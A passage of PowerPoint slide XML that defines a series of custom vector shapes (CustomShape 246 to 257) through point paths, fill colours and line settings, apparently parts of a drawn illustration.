          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="630" name="CustomShape 246"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2589120" y="3635280"/>
            <a:ext cx="256320" cy="84960"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="162" h="54">
                <a:moveTo>
                  <a:pt x="0" y="17"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="31" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="40" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="43" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="162" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="161" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="159" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="158" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="157" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="155" y="34"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="152" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="150" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="147" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="144" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="141" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="137" y="48"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="135" y="49"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="131" y="52"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="128" y="53"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="126" y="54"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="17"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="99d8d8"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="631" name="CustomShape 247"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2846520" y="3625920"/>
            <a:ext cx="89640" cy="40680"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="57" h="26">
                <a:moveTo>
                  <a:pt x="6" y="26"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="57" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="26"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="001999"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="632" name="CustomShape 248"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2606760" y="3449520"/>
            <a:ext cx="50040" cy="196200"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="32" h="124">
                <a:moveTo>
                  <a:pt x="32" y="4"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="32" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="31" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="124"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="124"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="124"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="124"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="123"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="123"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="123"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="122"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="122"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="121"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="120"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21" y="118"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="117"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="116"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="114"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="113"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="4"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="7fbfbf"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="633" name="CustomShape 249"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2608200" y="3452760"/>
            <a:ext cx="42120" cy="164520"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="27" h="104">
                <a:moveTo>
                  <a:pt x="27" y="2"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="27" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="23" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="104"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="104"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="104"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="104"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="104"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="102"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="102"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="101"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="101"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="99"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="98"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="23" y="97"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="95"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="93"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="2"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="93cccc"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="634" name="CustomShape 250"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2611440" y="3454560"/>
            <a:ext cx="34200" cy="132480"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="22" h="84">
                <a:moveTo>
                  <a:pt x="22" y="2"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="22" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="84"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="84"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="84"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="84"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="84"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="84"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="83"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="83"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="82"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="82"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="80"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="79"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="78"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="2"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="a8d8d8"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="635" name="CustomShape 251"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2612880" y="3456000"/>
            <a:ext cx="26280" cy="102600"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="17" h="65">
                <a:moveTo>
                  <a:pt x="17" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="17" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="65"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="64"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="64"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="62"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="58"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="bce5e5"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="636" name="CustomShape 252"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2612880" y="3457440"/>
            <a:ext cx="21600" cy="72360"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="14" h="46">
                <a:moveTo>
                  <a:pt x="14" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="14" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="d1f2f2"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="637" name="CustomShape 253"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2614680" y="3457440"/>
            <a:ext cx="13680" cy="42120"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="9" h="27">
                <a:moveTo>
                  <a:pt x="9" y="1"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="9" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="23"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="1"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="e5ffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="638" name="CustomShape 254"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2790720" y="3579840"/>
            <a:ext cx="21600" cy="21600"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="14" h="14">
                <a:moveTo>
                  <a:pt x="7" y="14"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="8" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="10" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="14"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="ffffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="639" name="CustomShape 255"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2725560" y="3579840"/>
            <a:ext cx="10440" cy="10440"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="7" h="7">
                <a:moveTo>
                  <a:pt x="3" y="7"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="5" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="7"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="ffffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="640" name="CustomShape 256"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2744640" y="3579840"/>
            <a:ext cx="7200" cy="10440"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="5" h="7">
                <a:moveTo>
                  <a:pt x="3" y="7"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="4" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="7"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="ffffff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="641" name="CustomShape 257"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2671920" y="3433680"/>
            <a:ext cx="29520" cy="145440"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
